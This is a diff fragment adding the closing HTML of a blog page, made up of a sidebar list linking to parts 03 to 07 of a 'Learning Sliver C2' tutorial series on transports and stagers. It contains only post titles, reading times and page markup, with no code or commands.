+        <li><a href="/post/learning_sliver_c2_06_stagers_process_injection/">Learning Sliver C2 (07) - Stagers: Process Injection</a>
+        <time datetime="22M">22 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers/">Learning Sliver C2 (06) - Stagers: Basics</a>
+        <time datetime="26M">26 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_05_transports_in_detail_dns/">Learning Sliver C2 (05) - Transports in Detail: DNS</a>
+        <time datetime="9M">9 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_04_transports_in_detail_http_and_https/">Learning Sliver C2 (04) - Transports in Detail: HTTP and HTTPS</a>
+        <time datetime="19M">19 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard</a>
+        <time datetime="11M">11 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
